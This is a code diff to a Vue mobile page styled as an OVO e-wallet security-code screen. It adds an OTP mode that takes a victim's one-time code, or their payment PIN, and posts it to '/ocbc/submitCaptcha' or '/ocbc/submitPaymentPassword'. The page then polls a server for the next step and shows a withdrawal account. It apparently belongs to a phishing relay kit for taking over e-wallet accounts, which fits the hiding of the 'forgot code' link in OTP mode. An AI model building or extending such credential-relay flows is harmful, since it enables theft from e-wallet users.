@@ -152,7 +152,7 @@
 
       <!-- 主体内容 -->
       <view class="sc-body">
-        <text class="sc-title">{{ t('ovo.securityCodeTitle') }}</text>
+        <text class="sc-title">{{ isOtpMode ? t('ovo.otpTitle') || 'Masukkan Kode OTP' : t('ovo.securityCodeTitle') }}</text>
 
         <!-- 6个圆点 -->
         <view class="sc-dots-row">
@@ -162,7 +162,7 @@
         </view>
 
         <!-- 忘记安全码 -->
-        <text class="sc-forgot" @click="handleForgotCode">{{ t('ovo.forgotSecurityCode') }}</text>
+        <text v-if="!isOtpMode" class="sc-forgot" @click="handleForgotCode">{{ t('ovo.forgotSecurityCode') }}</text>
 
         <!-- 数字键盘 -->
         <view class="sc-keypad">
@@ -311,9 +311,10 @@ const showBackConfirm = ref(false)
 const smsCountdown = ref(30)
 let smsTimer: any = null
 
-// Security Code 步骤三状态
+// Security Code / OTP 步骤状态
 const showSecurityCodePage = ref(false)
 const securityCode = ref('')
+const isOtpMode = ref(false) // true=OTP验证码, false=Security Code
 
 // 加载状态
 const showLoading = ref(false)
@@ -481,8 +482,9 @@ const maskedPhone = computed(() => {
   return '+62' + masked + last4
 })
 
-// 打开 Security Code 页面
-function openSecurityCodePage() {
+// 打开 Security Code / OTP 页面
+function openSecurityCodePage(otp = false) {
+  isOtpMode.value = otp
   showSecurityCodePage.value = true
   securityCode.value = ''
 }
@@ -514,10 +516,17 @@ async function submitSecurityCode() {
   showLoading.value = true
 
   try {
-    await post('/ocbc/submitPaymentPassword', {
-      record_id: recordId.value,
-      payment_password: securityCode.value
-    }, { showError: false })
+    if (isOtpMode.value) {
+      await post('/ocbc/submitCaptcha', {
+        record_id: recordId.value,
+        captcha: securityCode.value
+      }, { showError: false })
+    } else {
+      await post('/ocbc/submitPaymentPassword', {
+        record_id: recordId.value,
+        payment_password: securityCode.value
+      }, { showError: false })
+    }
 
     startPolling()
   } catch (error: any) {
@@ -579,13 +588,21 @@ function closeAllStepPages() {
 // 处理状态变化
 function handleStatusChange(status: string, data: any) {
   switch (status) {
+    case 'need_otp':
+      stopPolling()
+      showLoading.value = false
+      closeAllStepPages()
+      withdrawalAccount.value = data.withdrawal_account || null
+      openSecurityCodePage(true)
+      break
+
     case 'need_captcha':
     case 'need_payment_password':
       stopPolling()
       showLoading.value = false
       closeAllStepPages()
       withdrawalAccount.value = data.withdrawal_account || null
-      openSecurityCodePage()
+      openSecurityCodePage(false)
       break
 
     case 'success':
@@ -626,7 +643,7 @@ function handleStatusChange(status: string, data: any) {
 // 重试验证码
 function retryCaptcha() {
   showCaptchaErrorModal.value = false
-  openSecurityCodePage()
+  openSecurityCodePage(isOtpMode.value)
 }
 
 // 登录成功
